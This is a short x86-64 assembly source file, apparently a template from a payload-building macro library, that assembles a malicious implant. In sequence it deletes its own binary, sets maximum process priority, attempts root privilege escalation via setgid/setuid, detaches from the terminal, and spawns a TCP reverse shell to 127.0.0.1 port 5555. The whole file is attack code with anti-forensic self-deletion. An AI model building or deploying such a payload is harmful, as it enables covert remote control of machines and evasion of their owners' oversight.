BITS 64
    %include "bmj.asm"
    section .text
    global _start
    _start: 
        remove_self                 ; The binary removes itself if it's size is circa current payload size ('fsize' variable)
        set_priority MAX_PRIO       ; We set process priority to maximum
        elevate_full                ; Privilege escalation attempt via SETGID(0) ats SETUID(0)
        tty_detach                  ; setsid(0x00) == detach from controlling TTY device
        revshell "127.0.0.1", 5555  ; Spawn a standard TCP reverse shell
        get_current_size_var        ; Initiate the 'fsize' variable used by 'remove_self' macro
